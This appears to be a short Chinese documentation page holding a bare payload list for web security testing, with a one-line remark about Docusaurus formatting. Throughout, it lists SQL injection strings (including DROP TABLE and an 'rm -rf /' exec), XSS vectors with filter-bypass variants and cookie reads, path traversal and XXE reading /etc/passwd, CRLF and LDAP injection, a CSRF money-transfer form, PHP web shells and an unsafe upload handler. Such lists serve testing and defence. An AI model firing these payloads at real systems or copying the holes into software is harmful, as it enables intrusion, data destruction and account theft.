
注：因 docusaurus 不支持标签，所以用代码块注释
```
' or 1=1;--

; DROP TABLE users;--

' union select 1,2,3 --

<script>alert('XSS');</script>

"><script>alert('XSS')</script>

<img src=x onerror=alert('XSS')>

<svg/onload=alert('XSS')>

<a href="javascript:alert('XSS')">click me</a>

<iframe src="javascript:alert('XSS')">

<script>eval('alert("XSS")')</script>

../etc/passwd

'; exec('rm -rf /'); --

;ls -la

<img src="https://demo.com/dddd/wei-test-demo/blob/master/img.png" />

%u0061%u0062%u0063

<iframe src="javascript:alert('XSS')"></iframe>

%0D%0AContent-Length: 9999

<?php echo shell_exec($_GET['cmd']); ?>

<img src="javascript:alert(document.cookie)">

<script>alert(document.cookie)</script>

<a href="http://example.com/?foo=bar&baz=qux">

<input type="text" value="><script>alert('XSS')</script>">

(&(uid=hacker)(password=*))

*)(|(cn=*))(|(cn=*

<form action="https://www.example.com/transfer" method="POST">
  <input type="hidden" name="from" value="hacker@example.com">
  <input type="hidden" name="to" value="victim@example.com">
  <input type="hidden" name="amount" value="1000000">
  <input type="submit" value="Transfer">
</form>

<?php
  $filename = $_FILES['file']['name'];
  $tmpname = $_FILES['file']['tmp_name'];
  $extension = pathinfo($filename, PATHINFO_EXTENSION);
  $allowed_extensions = array("jpg", "jpeg", "png", "gif");

if (!in_array($extension, $allowed_extensions)) {
echo "Invalid file type";
exit;
}

move_uploaded_file($tmpname, "uploads/" . $filename);
?>

<?php eval($_GET['cmd']); ?>

<!DOCTYPE foo [
<!ELEMENT foo ANY >  
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

<!-- 大小写绕过 -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 编码绕过 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- 无括号执行 -->
<svg onload=alert`1`>

<!-- 注释绕过过滤 -->
<scr<!---->ipt>alert(1)</scr<!---->ipt>

<!-- 事件处理绕过 -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
```